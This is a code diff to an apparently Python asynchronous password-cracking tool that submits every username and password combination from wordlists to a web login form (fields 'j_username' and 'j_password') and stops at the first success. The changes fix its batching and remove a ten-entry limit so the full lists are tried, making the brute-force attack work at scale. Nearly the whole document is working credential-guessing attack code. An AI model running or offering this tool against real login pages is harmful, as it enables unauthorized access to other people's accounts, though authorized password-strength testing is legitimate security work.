@@ -38,7 +38,7 @@ def coroutine(f):
 async def crack(url:str, user_list:Path, password_list:Path, threads:int):
     myconn = aiohttp.TCPConnector()
     async with ClientSession(connector=myconn) as session:
-        for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(user_list, password_list)), MEMORY):
+        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(user_list, password_list)), MEMORY):
             results = await asyncio.gather(*batch, return_exceptions=True)
             for result in results:
                 if isinstance(result, Exception):
@@ -46,16 +46,30 @@ async def crack(url:str, user_list:Path, password_list:Path, threads:int):
                 if result:
                     sys.exit(0)
 
-def batched_tasks(genexpr, memory):
-    probe_element = next(genexpr)
+async def batched_tasks(genexpr:Generator, memory):
+    batch = []
+    try:
+        probe_element = next(genexpr)
+    except StopIteration:
+        yield batch
+        return
+    batch = [probe_element]
     batch_size = int(memory / sys.getsizeof(probe_element))
     logger.info("Using batch size of %s", batch_size)
-    yield [probe_element] + list(itertools.islice(genexpr, batch_size))
+    while True:
+        for _ in range(batch_size):
+            try:
+                batch.append(next(genexpr))
+            except StopIteration:
+                yield batch
+                return
+        yield batch
+        batch = []
     
 
 def permutations(user_list, password_list):
-    users = user_list.read_text("latin-1").splitlines()[0:10]
-    passwords = password_list.read_text("latin-1").splitlines()[0:10]
+    users = user_list.read_text("latin-1").splitlines()
+    passwords = password_list.read_text("latin-1").splitlines()
     for user in users:
         for password in passwords:
             yield {"j_username":user,"j_password": password, "Submit":"Sign+in"}
